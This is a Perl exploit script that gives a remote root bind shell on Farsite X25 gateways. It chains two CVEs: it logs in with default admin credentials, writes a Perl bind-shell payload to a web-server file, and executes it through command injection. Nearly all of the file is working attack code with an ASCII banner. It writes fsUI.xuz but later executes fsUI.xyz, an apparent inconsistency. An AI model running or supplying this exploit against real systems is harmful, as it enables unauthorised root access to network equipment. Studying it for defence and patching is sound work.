#!/usr/bin/perl
# Remote "root" shell on Farsite's X25 gateway
# Abuses CVE-2014-7173 combined with CVE-2014-7175
# Written by @Wireghoul - www.justanotherhacker.com
#
# Bring it down to the wire
# Set them all on fire
# and scrape
# Blue Stahli - Scrape
#
use IO::Socket::INET;
use LWP::UserAgent;

# Username cannot be changed from admin
my $user = "admin";
# farlinx is the default password
my $pass = "farlinx";
my $port = 4444;
my $ip = $ARGV[0];


print ".------.           ,-------------------------------------.\n";
print "|____   '.       .'   ___________________________________|\n";
print "     '.   '.   .'   .'                     \n";
print "       '.   '.'   .'  Farsite X25 Gateway  - Remote shell\n";
print "         '.     .'    Written by \@wireghoul \n";
print "          .'   '.     www.justanotherhacker.com   ___      ____  \n";
print "        .'   .   '.                             //   ) ) //    \n";
print "      .'   .' '.   '.                            ___/ / //__   \n";
print ".----'   .'     '.   '----------------------.  / ____/      ) )\n";
print "|______.'         '.________________________| / /____ ((___/ /\n";
print "\n";
if (!$ip) {
  print "Usage: $0 <ip> [password]\n";
  exit 2;
}
$pass = $ARGV[1] if $ARGV[1];
my $ua = LWP::UserAgent->new();
$ua->credentials("$ip:80", 'FarLinx User Authorisation', $user, $pass);

# Write bindshell to fsUI.xuz (CVE-2014-7175)
my $payload='/fsSaveUIPersistence.php?strSubmitData=use+IO;$p=fork();exit,if$p;$c=new+IO::Socket::INET(LocalPort,' . $port . ',Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_+while<>';
my $uri = 'http://' . $ip . $payload;
my $res = $ua->get($uri) or die ($!);
if (!$res->is_success()) {
  print "ABORT! ABORT! ABORT!\n". $res->status_line ."\n";
  exit;
}

# Exec the bindshell written file CVE-2014-7173
$payload = '/fsx25MonProxy.php?strSubmitData=start+|perl</http/htdocs/fsUI.xyz;echo';
$uri = 'http://' . $ip . $payload;
$ua->timeout(10);
$res = $ua->get($uri);

print "Your shell should be on $ip:$port, use '/http/bin/execCmd <cmd>'  to run commands as root\n";
exit;
